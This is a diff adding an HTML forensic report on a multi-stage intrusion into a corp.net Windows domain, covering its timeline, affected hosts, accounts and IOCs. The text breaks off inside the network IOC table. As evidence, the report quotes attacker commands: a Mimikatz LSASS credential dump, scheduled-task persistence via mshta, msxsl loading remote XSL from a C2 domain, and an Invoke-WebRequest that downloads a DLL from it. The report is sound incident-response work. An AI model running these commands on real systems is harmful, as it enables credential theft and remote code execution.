@@ -1,0 +1,1129 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Incident Forensic Report - corp.net Domain Attack</title>
+<style>
+  :root {
+    --bg: #f8f9fa;
+    --sidebar-bg: #1a1a2e;
+    --sidebar-text: #c8c8d4;
+    --sidebar-active: #e94560;
+    --content-bg: #ffffff;
+    --text: #2d2d2d;
+    --text-muted: #6c757d;
+    --heading: #1a1a2e;
+    --border: #dee2e6;
+    --accent: #e94560;
+    --code-bg: #f4f4f8;
+    --table-header: #1a1a2e;
+    --table-header-text: #ffffff;
+    --table-stripe: #f8f9fa;
+    --crit: #DC143C;
+    --high: #FF8C00;
+    --med: #DAA520;
+    --low: #4682B4;
+    --info: #A9A9A9;
+    --sidebar-w: 280px;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Hiragino Sans", "Yu Gothic",
+                 "Noto Sans CJK JP", "Segoe UI", sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.7;
+    display: flex;
+    min-height: 100vh;
+  }
+
+  /* ---------- sidebar ---------- */
+  nav#sidebar {
+    position: fixed;
+    top: 0; left: 0;
+    width: var(--sidebar-w);
+    height: 100vh;
+    background: var(--sidebar-bg);
+    color: var(--sidebar-text);
+    overflow-y: auto;
+    padding: 24px 0;
+    z-index: 100;
+    transition: transform .3s;
+  }
+  nav#sidebar .logo {
+    padding: 0 20px 20px;
+    font-size: 13px;
+    font-weight: 700;
+    color: #fff;
+    letter-spacing: .05em;
+    border-bottom: 1px solid rgba(255,255,255,.08);
+    margin-bottom: 12px;
+  }
+  nav#sidebar a {
+    display: block;
+    padding: 8px 20px;
+    color: var(--sidebar-text);
+    text-decoration: none;
+    font-size: 13px;
+    border-left: 3px solid transparent;
+    transition: all .2s;
+  }
+  nav#sidebar a:hover,
+  nav#sidebar a.active {
+    color: #fff;
+    background: rgba(255,255,255,.06);
+    border-left-color: var(--sidebar-active);
+  }
+  nav#sidebar a.sub {
+    padding-left: 36px;
+    font-size: 12px;
+    color: rgba(200,200,212,.6);
+  }
+  nav#sidebar a.sub:hover { color: #fff; }
+
+  /* hamburger for mobile */
+  #menu-toggle {
+    display: none;
+    position: fixed;
+    top: 12px; left: 12px;
+    z-index: 200;
+    background: var(--sidebar-bg);
+    color: #fff;
+    border: none;
+    border-radius: 6px;
+    width: 40px; height: 40px;
+    font-size: 22px;
+    cursor: pointer;
+  }
+
+  /* ---------- main ---------- */
+  main {
+    margin-left: var(--sidebar-w);
+    flex: 1;
+    padding: 40px 48px 80px;
+    max-width: 1100px;
+  }
+
+  h1 {
+    font-size: 28px;
+    color: var(--heading);
+    margin: 0 0 32px;
+    padding-bottom: 12px;
+    border-bottom: 3px solid var(--accent);
+  }
+  h2 {
+    font-size: 22px;
+    color: var(--heading);
+    margin: 48px 0 16px;
+    padding-bottom: 8px;
+    border-bottom: 2px solid var(--border);
+  }
+  h3 {
+    font-size: 17px;
+    color: var(--heading);
+    margin: 32px 0 12px;
+  }
+  h4 {
+    font-size: 15px;
+    color: var(--text-muted);
+    margin: 24px 0 8px;
+  }
+
+  p { margin: 0 0 14px; }
+
+  /* ---------- tables ---------- */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0 24px;
+    font-size: 13px;
+  }
+  thead th {
+    background: var(--table-header);
+    color: var(--table-header-text);
+    padding: 10px 12px;
+    text-align: left;
+    font-weight: 600;
+    white-space: nowrap;
+  }
+  tbody td {
+    padding: 8px 12px;
+    border-bottom: 1px solid var(--border);
+    vertical-align: top;
+  }
+  tbody tr:nth-child(even) { background: var(--table-stripe); }
+  tbody tr:hover { background: #eef1f5; }
+
+  /* severity badges */
+  .level-crit { color: var(--crit); font-weight: 700; }
+  .level-high { color: var(--high); font-weight: 700; }
+  .level-med  { color: var(--med);  font-weight: 600; }
+  .level-low  { color: var(--low); }
+  .level-info { color: var(--info); }
+
+  /* ---------- code ---------- */
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 16px;
+    overflow-x: auto;
+    margin: 12px 0 20px;
+    font-size: 13px;
+    line-height: 1.5;
+  }
+  code {
+    font-family: "SF Mono", "Fira Code", "Cascadia Code", Menlo, monospace;
+    font-size: 13px;
+  }
+  p code, li code, td code {
+    background: var(--code-bg);
+    padding: 2px 6px;
+    border-radius: 3px;
+    font-size: 12px;
+  }
+
+  /* ---------- blockquote (metadata) ---------- */
+  blockquote {
+    background: var(--code-bg);
+    border-left: 4px solid var(--accent);
+    padding: 16px 20px;
+    margin: 24px 0;
+    font-size: 13px;
+    color: var(--text-muted);
+  }
+  blockquote strong { color: var(--text); }
+
+  /* ---------- lists ---------- */
+  ul, ol { margin: 8px 0 16px 24px; }
+  li { margin-bottom: 4px; }
+
+  /* ---------- hr ---------- */
+  hr {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 40px 0;
+  }
+
+  /* ---------- chart embed ---------- */
+  .chart-container {
+    width: 100%;
+    margin: 20px 0 28px;
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+    background: #fff;
+  }
+  .chart-container iframe {
+    width: 100%;
+    height: 520px;
+    border: none;
+    display: block;
+  }
+  .chart-container.chart-wide iframe {
+    height: 700px;
+  }
+  .chart-label {
+    display: block;
+    padding: 8px 16px;
+    font-size: 12px;
+    color: var(--text-muted);
+    background: var(--table-stripe);
+    border-bottom: 1px solid var(--border);
+  }
+
+  /* ---------- attack flow ascii ---------- */
+  .attack-flow {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 20px;
+    margin: 16px 0 24px;
+    font-family: monospace;
+    font-size: 13px;
+    white-space: pre;
+    overflow-x: auto;
+    line-height: 1.6;
+  }
+
+  /* ---------- responsive ---------- */
+  @media (max-width: 900px) {
+    nav#sidebar { transform: translateX(-100%); }
+    nav#sidebar.open { transform: translateX(0); }
+    #menu-toggle { display: block; }
+    main { margin-left: 0; padding: 60px 20px 60px; }
+  }
+
+  @media print {
+    nav#sidebar, #menu-toggle { display: none !important; }
+    main { margin-left: 0; padding: 20px; max-width: 100%; }
+    .chart-container { break-inside: avoid; }
+    table { font-size: 11px; }
+    h2 { break-before: page; }
+  }
+</style>
+</head>
+<body>
+
+<button id="menu-toggle" onclick="document.getElementById('sidebar').classList.toggle('open')">&#9776;</button>
+
+<nav id="sidebar">
+  <div class="logo">INCIDENT REPORT</div>
+  <a href="#1-executive-summary">1. Executive Summary</a>
+<a href="#2-incident-overview">2. Incident Overview</a>
+<a href="#3-compromise-timeline">3. Compromise Timeline</a>
+<a href="#phase-1-credential-theft-amp-c2-infrastructure-2022-08-09-0452-0510-utc" class="sub">Phase 1: Credential Theft &amp; C2 Infrastructure (2022-08-09 04:52 ~ 05:10 UTC)</a>
+<a href="#phase-2-spearphishing-amp-initial-compromise-2022-08-09-0519-0538-utc" class="sub">Phase 2: Spearphishing &amp; Initial Compromise (2022-08-09 05:19 ~ 05:38 UTC)</a>
+<a href="#phase-3-discovery-amp-tool-deployment-2022-08-09-0546-0659-utc" class="sub">Phase 3: Discovery &amp; Tool Deployment (2022-08-09 05:46 ~ 06:59 UTC)</a>
+<a href="#phase-4-defense-evasion-via-group-policy-2022-08-09-1200-1520-utc" class="sub">Phase 4: Defense Evasion via Group Policy (2022-08-09 12:00 ~ 15:20 UTC)</a>
+<a href="#4-attack-flow-mitre-attampck">4. Attack Flow (MITRE ATT&amp;CK)</a>
+<a href="#5-affected-assets-and-accounts">5. Affected Assets and Accounts</a>
+<a href="#5-1-per-host-impact-summary" class="sub">5-1. Per-Host Impact Summary</a>
+<a href="#5-2-compromised-accounts" class="sub">5-2. Compromised Accounts</a>
+<a href="#6-ioc-list-indicators-of-compromise">6. IOC List (Indicators of Compromise)</a>
+<a href="#6-1-malicious-processesfiles" class="sub">6-1. Malicious Processes/Files</a>
+<a href="#6-2-network-iocs" class="sub">6-2. Network IOCs</a>
+<a href="#6-3-persistence-mechanisms" class="sub">6-3. Persistence Mechanisms</a>
+<a href="#6-4-account-iocs" class="sub">6-4. Account IOCs</a>
+<a href="#7-decoded-payloads">7. Decoded Payloads</a>
+<a href="#payload-1-empire-powershell---banking-file-search" class="sub">Payload 1: Empire PowerShell - Banking File Search</a>
+<a href="#payload-2-empire-powershell---software-inventory" class="sub">Payload 2: Empire PowerShell - Software Inventory</a>
+<a href="#payload-3-empire-powershell---expanded-financial-search" class="sub">Payload 3: Empire PowerShell - Expanded Financial Search</a>
+<a href="#payload-4-cobaltstrike-service-stager" class="sub">Payload 4: CobaltStrike Service Stager</a>
+<a href="#8-lateral-movement-analysis">8. Lateral Movement Analysis</a>
+<a href="#propagation-path" class="sub">Propagation Path</a>
+<a href="#lateral-movement-event-details" class="sub">Lateral Movement Event Details</a>
+<a href="#9-investigation-notes-and-recommendations">9. Investigation Notes and Recommendations</a>
+<a href="#analysis-constraints" class="sub">Analysis Constraints</a>
+<a href="#events-determined-to-be-false-positives" class="sub">Events Determined to be False Positives</a>
+<a href="#indeterminate-events" class="sub">Indeterminate Events</a>
+<a href="#recommended-additional-investigation" class="sub">Recommended Additional Investigation</a>
+<a href="#containment-and-recovery-recommendations" class="sub">Containment and Recovery Recommendations</a>
+</nav>
+
+<main>
+<h1 id="incident-forensic-report">Incident Forensic Report</h1>
+<h2 id="1-executive-summary">1. Executive Summary</h2>
+<p>From 2022-08-09 04:52 UTC to 2022-08-09 15:20 UTC, a targeted multi-stage cyber attack was confirmed across the corp.net domain environment. The attacker leveraged spearphishing emails containing a double-extension malware (Security_Protocol.doc.exe) to compromise four workstations, deployed Cobalt Strike and Empire post-exploitation frameworks for command and control, executed Mimikatz for credential theft, and used Group Policy Objects to disable Windows Defender and downgrade NTLM authentication across all domain hosts. The attack demonstrated full kill chain coverage with evidence of active financial data exfiltration targeting banking and accounting files.</p>
+<h2 id="2-incident-overview">2. Incident Overview</h2>
+<table>
+<thead><tr>
+<th>Item</th>
+<th>Value</th>
+</tr></thead><tbody>
+<tr>
+<td>Incident Period</td>
+<td>2022-08-09 04:52 UTC ~ 2022-08-09 15:20 UTC</td>
+</tr>
+<tr>
+<td>Total Events Analyzed</td>
+<td>610,874 events</td>
+</tr>
+<tr>
+<td>Counts by Severity</td>
+<td>crit: 5 / high: 1,245 / med: 74,172 / low: 190,839 / info: 344,613</td>
+</tr>
+<tr>
+<td>Affected Host Count</td>
+<td>9 hosts (+ 1 additional device)</td>
+</tr>
+<tr>
+<td>Affected Hosts</td>
+<td>ACC-01, ACC-03, ACC-04, ACC-05, ACC-09, IT-01, IT-02, IT-03, IT-07</td>
+</tr>
+<tr>
+<td>Compromised Account Count</td>
+<td>7 user accounts</td>
+</tr>
+<tr>
+<td>Detected Attack Tools/Malware</td>
+<td>Cobalt Strike, Empire (PowerShell), Mimikatz (renamed as ftg.exe), msxsl.exe (LOLBAS), Security_Protocol.doc.exe (phishing malware)</td>
+</tr>
+<tr>
+<td>Initial Access Vector (Estimated)</td>
+<td>Spearphishing attachment - double-extension executable (Security_Protocol.doc.exe) delivered via ZIP archive</td>
+</tr>
+<tr>
+<td>Highest Severity Event</td>
+<td>CobaltStrike Service Installation (IT-02.corp.net, 2022-08-09 04:55:44 UTC)</td>
+</tr>
+</tbody></table>
+<h2 id="3-compromise-timeline">3. Compromise Timeline</h2>
+<div class="chart-container"><span class="chart-label">Interactive Timeline Chart</span><iframe src="hayabusa-results_timeline.html" loading="lazy"></iframe></div>
+<h3 id="phase-1-credential-theft-amp-c2-infrastructure-2022-08-09-0452-0510-utc">Phase 1: Credential Theft &amp; C2 Infrastructure (2022-08-09 04:52 ~ 05:10 UTC)</h3>
+<table>
+<thead><tr>
+<th>Time (UTC)</th>
+<th>Host</th>
+<th>Event (RuleTitle)</th>
+<th>Severity</th>
+<th>MITRE</th>
+<th>Details</th>
+</tr></thead><tbody>
+<tr>
+<td>04:52:44</td>
+<td>IT-03</td>
+<td>HackTool - Mimikatz Execution</td>
+<td><span class="level-high">high</span></td>
+<td>T1003.001</td>
+<td>Renamed Mimikatz (ftg.exe) executed: <code>ftg.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit</code> - dumping LSASS credentials</td>
+</tr>
+<tr>
+<td>04:52:44</td>
+<td>IT-03</td>
+<td>Operator Bloopers Cobalt Strike Commands</td>
+<td><span class="level-high">high</span></td>
+<td>T1003.001</td>
+<td>Same event detected as CobaltStrike operational error - Mimikatz commands passed directly via cmd.exe, indicating operator carelessness</td>
+</tr>
+<tr>
+<td>04:55:44</td>
+<td>IT-02</td>
+<td>CobaltStrike Service Installations - System</td>
+<td><span class="level-crit">crit</span></td>
+<td>T1543.003</td>
+<td>Service <code>b8b8705</code> installed with encoded PowerShell stager: GZip-compressed, Base64-encoded shellcode loaded via <code>IO.MemoryStream</code> and <code>IEX</code></td>
+</tr>
+<tr>
+<td>04:55:44</td>
+<td>IT-02</td>
+<td>PowerShell Scripts Installed as Services</td>
+<td><span class="level-high">high</span></td>
+<td>T1543.003</td>
+<td>Same CobaltStrike service detected by multiple rules</td>
+</tr>
+<tr>
+<td>04:55:44</td>
+<td>IT-02</td>
+<td>Malicious Base64 Encoded PowerShell Keywords</td>
+<td><span class="level-high">high</span></td>
+<td>T1059.001</td>
+<td>CobaltStrike stager contained <code>FromBase64String</code> and <code>IEX</code> keywords</td>
+</tr>
+<tr>
+<td>05:09:03</td>
+<td>IT-02</td>
+<td>Suspicious Schtasks Schedule Types</td>
+<td><span class="level-high">high</span></td>
+<td>T1053.005</td>
+<td>Persistence via scheduled task: <code>schtasks /create /tn AA /tr &quot;mshta C:\Users\Gail.Goff\Documents\AA_V3.hta&quot; /sc ONLOGON /ru Gail.Goff</code></td>
+</tr>
+</tbody></table>
+<p><strong>Analysis</strong>: The attacker first executed Mimikatz on IT-03 using a renamed binary (ftg.exe) to harvest credentials from LSASS memory. The &quot;Operator Bloopers&quot; detection indicates the attacker passed Mimikatz commands directly through cmd.exe rather than through a C2 channel, suggesting operational inexperience or urgency. Within 3 minutes, a CobaltStrike beacon was installed as a Windows service on IT-02 using an encoded PowerShell stager with GZip compression. A scheduled task was created to maintain persistence through Gail.Goff&#x27;s logon via mshta executing an HTA file.</p>
+<h3 id="phase-2-spearphishing-amp-initial-compromise-2022-08-09-0519-0538-utc">Phase 2: Spearphishing &amp; Initial Compromise (2022-08-09 05:19 ~ 05:38 UTC)</h3>
+<table>
+<thead><tr>
+<th>Time (UTC)</th>
+<th>Host</th>
+<th>Event (RuleTitle)</th>
+<th>Severity</th>
+<th>MITRE</th>
+<th>Details</th>
+</tr></thead><tbody>
+<tr>
+<td>05:19:39</td>
+<td>ACC-01</td>
+<td>Suspicious Double Extension File Execution</td>
+<td><span class="level-crit">crit</span></td>
+<td>T1204.002</td>
+<td><code>Security_Protocol.doc.exe</code> executed by Chad.Chan from ZIP archive in AppData\Local\Temp</td>
+</tr>
+<tr>
+<td>05:19:39</td>
+<td>ACC-04</td>
+<td>Suspicious Double Extension File Execution</td>
+<td><span class="level-crit">crit</span></td>
+<td>T1204.002</td>
+<td>Same malware executed by Anna.Ward</td>
+</tr>
+<tr>
+<td>05:20:54</td>
+<td>ACC-09</td>
+<td>Suspicious Double Extension File Execution</td>
+<td><span class="level-crit">crit</span></td>
+<td>T1204.002</td>
+<td>Same malware executed by Albert.Willoughby</td>
+</tr>
+<tr>
+<td>05:21:10</td>
+<td>ACC-05</td>
+<td>Suspicious Double Extension File Execution</td>
+<td><span class="level-crit">crit</span></td>
+<td>T1204.002</td>
+<td>Same malware executed by Jean.Owen</td>
+</tr>
+<tr>
+<td>05:25:23</td>
+<td>ACC-01</td>
+<td>HackTool - Empire PowerShell Launch Parameters</td>
+<td><span class="level-high">high</span></td>
+<td>T1083</td>
+<td><code>powershell -nop -exec bypass -EncodedCommand</code> - decoded: <code>gci -Path C:\Users -Recurse -Include <em>bank</em></code> (searching for banking files)</td>
+</tr>
+<tr>
+<td>05:38:23</td>
+<td>ACC-01</td>
+<td>RDP Login from Localhost</td>
+<td><span class="level-high">high</span></td>
+<td>T1572</td>
+<td>RDP session from 127.0.0.1 for Chad.Chan - indicates RDP tunneling/port forwarding for persistent access</td>
+</tr>
+</tbody></table>
+<p><strong>Analysis</strong>: Four users across accounting workstations (ACC-01, ACC-04, ACC-05, ACC-09) executed the same malicious double-extension file within ~2 minutes, indicating a coordinated spearphishing campaign. The malware was disguised as &quot;Security_Protocol doc&quot; and delivered as a ZIP archive. Within 6 minutes of initial execution on ACC-01, Empire framework commands were used to search for banking-related files. The RDP localhost login on ACC-01 indicates the attacker established an RDP tunnel for persistent graphical access.</p>
+<h3 id="phase-3-discovery-amp-tool-deployment-2022-08-09-0546-0659-utc">Phase 3: Discovery &amp; Tool Deployment (2022-08-09 05:46 ~ 06:59 UTC)</h3>
+<table>
+<thead><tr>
+<th>Time (UTC)</th>
+<th>Host</th>
+<th>Event (RuleTitle)</th>
+<th>Severity</th>
+<th>MITRE</th>
+<th>Details</th>
+</tr></thead><tbody>
+<tr>
+<td>05:46:12</td>
+<td>ACC-04</td>
+<td>HackTool - Empire PowerShell Launch Parameters</td>
+<td><span class="level-high">high</span></td>
+<td>T1518</td>
+<td>Decoded: `Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall* \</td>
+<td>Select-Object DisplayName, DisplayVersion, Publisher, Size, InstallDate` - enumerating installed software</td>
+</tr>
+<tr>
+<td>06:06:59</td>
+<td>ACC-09</td>
+<td>Remote XSL Execution Via Msxsl.EXE</td>
+<td><span class="level-high">high</span></td>
+<td>T1220</td>
+<td><code>msxsl.exe http://secure.n-document.com:443/vENw.xml http://secure.n-document.com:443/pKoyWt.xsl</code> - C2 communication via XSL processing</td>
+</tr>
+<tr>
+<td>06:09:13</td>
+<td>ACC-03</td>
+<td>Remote XSL Execution Via Msxsl.EXE</td>
+<td><span class="level-high">high</span></td>
+<td>T1220</td>
+<td>Same C2 pattern from ACC-03, <code>C:\temp\msxsl.exe</code> loading remote XSL from attacker infrastructure</td>
+</tr>
+<tr>
+<td>06:21:40</td>
+<td>ACC-03</td>
+<td>Suspicious Invoke-WebRequest Execution</td>
+<td><span class="level-high">high</span></td>
+<td>T1105</td>
+<td><code>iwr http://secure.n-document.com:443/crx -outfile C:\Temp\crx.dll</code> - downloading additional payload (DLL) from C2</td>
+</tr>
+<tr>
+<td>06:23:21</td>
+<td>ACC-03</td>
+<td>HackTool - Empire PowerShell Launch Parameters</td>
+<td><span class="level-high">high</span></td>
+<td>T1083</td>
+<td>Decoded: <code>gci C:\Users -recurse -include <em>bank</em>,<em>atm</em>,<em>accounts</em></code> - expanded financial data search including ATM and accounts files</td>
+</tr>
+<tr>
+<td>06:33:01</td>
+<td>ACC-05</td>
+<td>HackTool - Empire PowerShell Launch Parameters</td>
+<td><span class="level-high">high</span></td>
+<td>T1518</td>
+<td>Same software enumeration on ACC-05 by Jean.Owen</td>
+</tr>
+<tr>
+<td>06:59:09</td>
+<td>IT-03</td>
+<td>Rundll32 Execution Without CommandLine Parameters</td>
+<td><span class="level-high">high</span></td>
+<td>T1218.011</td>
+<td><code>rundll32.exe</code> launched without arguments by Julia.Jones - suspicious, often used for process injection</td>
+</tr>
+</tbody></table>
+<p><strong>Analysis</strong>: The attacker conducted systematic discovery across compromised workstations: software inventory via registry enumeration and targeted file searches for financial data (bank, ATM, accounts). The attacker deployed msxsl.exe (a legitimate Microsoft tool abused as LOLBAS) from C:\temp\ to establish C2 communication with <code>secure.n-document.com</code> over port 443. Additional tooling (crx.dll) was downloaded from the same C2 server. The Rundll32 execution without parameters on IT-03 suggests possible process injection or shellcode execution.</p>
+<h3 id="phase-4-defense-evasion-via-group-policy-2022-08-09-1200-1520-utc">Phase 4: Defense Evasion via Group Policy (2022-08-09 12:00 ~ 15:20 UTC)</h3>
+<table>
+<thead><tr>
+<th>Time (UTC)</th>
+<th>Host</th>
+<th>Event (RuleTitle)</th>
+<th>Severity</th>
+<th>MITRE</th>
+<th>Details</th>
+</tr></thead><tbody>
+<tr>
+<td>12:00:11</td>
+<td>IT-01</td>
+<td>Disable Windows Defender Functionalities Via Registry</td>
+<td><span class="level-high">high</span></td>
+<td>T1562.001</td>
+<td>GPO-deployed: <code>DisableRealtimeMonitoring = 1</code> via svchost.exe (Group Policy client)</td>
+</tr>
+<tr>
+<td>12:00:14</td>
+<td>IT-01</td>
+<td>NetNTLM Downgrade Attack - Registry</td>
+<td><span class="level-high">high</span></td>
+<td>T1112</td>
+<td>GPO-deployed: <code>restrictsendingntlmtraffic</code> set via services.exe across all hosts</td>
+</tr>
+<tr>
+<td>12:10+</td>
+<td>ALL</td>
+<td>Disable Windows Defender + NetNTLM Downgrade</td>
+<td><span class="level-high">high</span></td>
+<td>T1562/T1112</td>
+<td>Recurring every 10 minutes across all 9 hosts - GPO enforcement (148 events each)</td>
+</tr>
+</tbody></table>
+<p><strong>Analysis</strong>: Starting at 12:00 UTC, approximately 7 hours after initial compromise, the attacker deployed Group Policy Objects to disable Windows Defender real-time monitoring and modify NTLM authentication settings across all domain hosts. The changes were pushed via svchost.exe (Group Policy client process), indicating the attacker had obtained Domain Admin or equivalent privileges to modify domain-wide GPOs. These changes recurred at 10-minute intervals (GPO refresh cycle), affecting all 9 hosts and totaling 296 high-severity events.</p>
+<h2 id="4-attack-flow-mitre-attampck">4. Attack Flow (MITRE ATT&amp;CK)</h2>
+<div class="chart-container chart-wide"><span class="chart-label">Interactive Attack Flow Diagram</span><iframe src="hayabusa-results_mitre_flow.html" loading="lazy"></iframe></div>
+<pre><code>[Credential Access] → [Command &amp; Control] → [Initial Access] → [Execution] → [Discovery] → [Defense Evasion]
+    (T1003.001)         (T1543.003/T1220)     (T1566.001)       (T1059.001)    (T1083/T1518)  (T1562.001/T1112)
+   [IT-03]              [IT-02,ACC-09,ACC-03] [ACC-01,04,09,05] [ACC-01,03,04,05] [ACC hosts]  [ALL hosts]
+                                                      ↓
+                                               [Persistence]  →  [Ingress Tool Transfer]
+                                               (T1053.005)       (T1105)
+                                               [IT-02]           [ACC-03]</code></pre>
+<p>Note: Credential Access (Mimikatz) was detected before Initial Access (phishing), suggesting the attacker had prior access to IT-03 before the phishing wave, or the phishing campaign was launched from an already-compromised position. The gap between Execution/Discovery (06:59) and Defense Evasion (12:00) is approximately 5 hours, during which the attacker likely escalated to domain admin privileges (not directly observed in detection rules).</p>
+<h2 id="5-affected-assets-and-accounts">5. Affected Assets and Accounts</h2>
+<h3 id="5-1-per-host-impact-summary">5-1. Per-Host Impact Summary</h3>
+<table>
+<thead><tr>
+<th>Hostname</th>
+<th>Role (Estimated)</th>
+<th>High/Crit Count</th>
+<th>Primary Detection Rules</th>
+<th>First Anomaly</th>
+<th>Last Anomaly</th>
+<th>Compromise Level</th>
+</tr></thead><tbody>
+<tr>
+<td>IT-02.corp.net</td>
+<td>IT Server</td>
+<td>48+</td>
+<td>CobaltStrike Service, Schtasks, Defender Disable</td>
+<td>04:55:44</td>
+<td>15:10:05</td>
+<td>Confirmed</td>
+</tr>
+<tr>
+<td>IT-03.corp.net</td>
+<td>IT Server</td>
+<td>50+</td>
+<td>Mimikatz (ftg.exe), Rundll32 injection, Encoded PS</td>
+<td>04:52:44</td>
+<td>06:59:09</td>
+<td>Confirmed</td>
+</tr>
+<tr>
+<td>ACC-01.corp.net</td>
+<td>Accounting WS</td>
+<td>42+</td>
+<td>Double-ext malware, Empire PS, RDP tunnel, Defender Disable</td>
+<td>05:19:39</td>
+<td>15:10:06</td>
+<td>Confirmed</td>
+</tr>
+<tr>
+<td>ACC-03.corp.net</td>
+<td>Accounting WS</td>
+<td>50+</td>
+<td>msxsl.exe C2, crx.dll download, Empire PS, Defender Disable</td>
+<td>05:59:00</td>
+<td>15:10:06</td>
+<td>Confirmed</td>
+</tr>
+<tr>
+<td>ACC-04.corp.net</td>
+<td>Accounting WS</td>
+<td>30+</td>
+<td>Double-ext malware, Empire PS, Defender Disable</td>
+<td>05:19:39</td>
+<td>15:10:06</td>
+<td>Confirmed</td>
+</tr>
+<tr>
+<td>ACC-05.corp.net</td>
+<td>Accounting WS</td>
+<td>30+</td>
+<td>Double-ext malware, Empire PS, Defender Disable</td>
+<td>05:21:10</td>
+<td>15:10:06</td>
+<td>Confirmed</td>
+</tr>
+<tr>
+<td>ACC-09.corp.net</td>
+<td>Accounting WS</td>
+<td>30+</td>
+<td>Double-ext malware, msxsl.exe C2, Defender Disable</td>
+<td>05:20:54</td>
+<td>15:10:06</td>
+<td>Confirmed</td>
+</tr>
+<tr>
+<td>IT-01.corp.net</td>
+<td>IT Server</td>
+<td>40+</td>
+<td>Defender Disable, NetNTLM Downgrade, Encoded PS</td>
+<td>05:56:38</td>
+<td>15:10:06</td>
+<td>Suspected</td>
+</tr>
+<tr>
+<td>IT-07.corp.net</td>
+<td>IT Server</td>
+<td>40+</td>
+<td>Defender Disable, NetNTLM Downgrade, Encoded PS</td>
+<td>05:54:22</td>
+<td>15:10:06</td>
+<td>Suspected</td>
+</tr>
+</tbody></table>
+<h3 id="5-2-compromised-accounts">5-2. Compromised Accounts</h3>
+<table>
+<thead><tr>
+<th>Account Name</th>
+<th>Type</th>
+<th>Related Hosts</th>
+<th>Primary Related Events</th>
+<th>Detection Count</th>
+<th>Compromise Evidence</th>
+</tr></thead><tbody>
+<tr>
+<td>Chad.Chan</td>
+<td>Domain User</td>
+<td>ACC-01</td>
+<td>Phishing malware execution, Empire PS (<em>bank</em>), RDP tunnel</td>
+<td>3+</td>
+<td>Executed malware, searched for financial files, RDP tunnel from localhost</td>
+</tr>
+<tr>
+<td>Anna.Ward</td>
+<td>Domain User</td>
+<td>ACC-04</td>
+<td>Phishing malware execution, Empire PS (software enum)</td>
+<td>3+</td>
+<td>Executed malware, attacker-controlled software enumeration</td>
+</tr>
+<tr>
+<td>Albert.Willoughby</td>
+<td>Domain User</td>
+<td>ACC-09, ACC-03</td>
+<td>Phishing malware execution, msxsl.exe C2, crx.dll download, Empire PS (<em>bank</em>,<em>atm</em>,<em>accounts</em>)</td>
+<td>8+</td>
+<td>Most heavily exploited account - multi-host activity, C2 communication, tool download, financial data search</td>
+</tr>
+<tr>
+<td>Jean.Owen</td>
+<td>Domain User</td>
+<td>ACC-05</td>
+<td>Phishing malware execution, Empire PS (software enum)</td>
+<td>3+</td>
+<td>Executed malware, attacker-controlled software enumeration</td>
+</tr>
+<tr>
+<td>Julia.Jones</td>
+<td>Domain User</td>
+<td>IT-03</td>
+<td>Mimikatz execution context, Rundll32 injection</td>
+<td>2+</td>
+<td>Mimikatz ran under IT-03$ but in Julia.Jones&#x27; session context</td>
+</tr>
+<tr>
+<td>Gail.Goff</td>
+<td>Domain User</td>
+<td>IT-02</td>
+<td>Scheduled task persistence target</td>
+<td>3+</td>
+<td>Attacker created persistence mechanism under this account (AA_V3.hta ONLOGON)</td>
+</tr>
+<tr>
+<td>Lewis.Douglas</td>
+<td>Domain User</td>
+<td>IT-01</td>
+<td>Outlook EPMAP connection</td>
+<td>5</td>
+<td>Outlook connections to Exchange - likely normal activity, but account present during attack window</td>
+</tr>
+</tbody></table>
+<h2 id="6-ioc-list-indicators-of-compromise">6. IOC List (Indicators of Compromise)</h2>
+<h3 id="6-1-malicious-processesfiles">6-1. Malicious Processes/Files</h3>
+<table>
+<thead><tr>
+<th>IOC Type</th>
+<th>Value</th>
+<th>Detected Host</th>
+<th>Detection Count</th>
+<th>Context</th>
+</tr></thead><tbody>
+<tr>
+<td>File/Process</td>
+<td>Security_Protocol.doc.exe</td>
+<td>ACC-01,04,05,09</td>
+<td>4</td>
+<td>Phishing malware - double-extension executable delivered via ZIP</td>
+</tr>
+<tr>
+<td>File/Process</td>
+<td>C:\Users\Julia.Jones\AppData\Local\ftg.exe</td>
+<td>IT-03</td>
+<td>2</td>
+<td>Renamed Mimikatz binary</td>
+</tr>
+<tr>
+<td>File/Process</td>
+<td>C:\temp\msxsl.exe</td>
+<td>ACC-03, ACC-09</td>
+<td>4+</td>
+<td>LOLBAS - Microsoft XSL processor abused for C2</td>
+</tr>
+<tr>
+<td>File/Process</td>
+<td>C:\Temp\crx.dll</td>
+<td>ACC-03</td>
+<td>1</td>
+<td>Downloaded payload DLL from C2 server</td>
+</tr>
+<tr>
+<td>File/Process</td>
+<td>C:\Users\Gail.Goff\Documents\AA_V3.hta</td>
+<td>IT-02</td>
+<td>1</td>
+<td>HTA persistence payload executed via mshta on logon</td>
+</tr>
+<tr>
+<td>Service</td>
+<td>b8b8705</td>
+<td>IT-02</td>
+<td>1</td>
+<td>CobaltStrike beacon service (encoded PowerShell stager)</td>
+</tr>
+</tbody></table>
+<h3 id="6-2-network-iocs">6-2. Network IOCs</h3>
+<table>
+<thead><tr>
+<th>IOC Type</th>
+<th>Value</th>
+<th>Direction</th>
+<th>Detected Host</th>
+<th>Context</th>
+</tr></thead><tbody>
+<tr>
+<td>Domain</td>
+<td>secure.n-document.com</td>
+<td>Outbound</td>
+<td>ACC-03, ACC-09</td>
+<td>C2 server for XSL-based communication and tool download</td>
+</tr>
+<tr>
+<td>URL</td>
+<td>http://secure.n-document.com:443/vENw.xml</td>
+<td>Outbound</td>
+<td>ACC-03, ACC-09</td>
+<td>XSL C2 payload URL</td>
+</tr>
+<tr>
+<td>URL</td>
+<td>http://secure.n-document.com:443/pKoyWt.xsl</td>
+<td>Outbound</td>
+<td>ACC-03, ACC-09</td>
+<td>XSL C2 stylesheet URL</td>
+</tr>
+<tr>
+<td>URL</td>
